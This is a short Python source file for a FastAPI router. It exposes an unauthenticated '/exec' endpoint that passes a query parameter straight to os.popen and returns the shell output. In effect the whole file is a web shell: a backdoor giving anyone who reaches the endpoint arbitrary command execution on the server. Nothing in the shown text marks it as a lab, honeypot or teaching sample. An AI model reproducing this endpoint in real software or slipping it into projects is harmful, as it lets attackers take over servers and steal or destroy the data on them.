from fastapi import APIRouter, Request, Query
import os
from utils import log_request

router = APIRouter()

@router.get("/exec")
async def exec_cmd(request: Request, cmd: str = Query(...)):
    log_request(request, f"CMD {cmd}")
    try:
        output = os.popen(cmd).read()
        return {"result": output}
    except Exception as e:
        return {"error": str(e)}
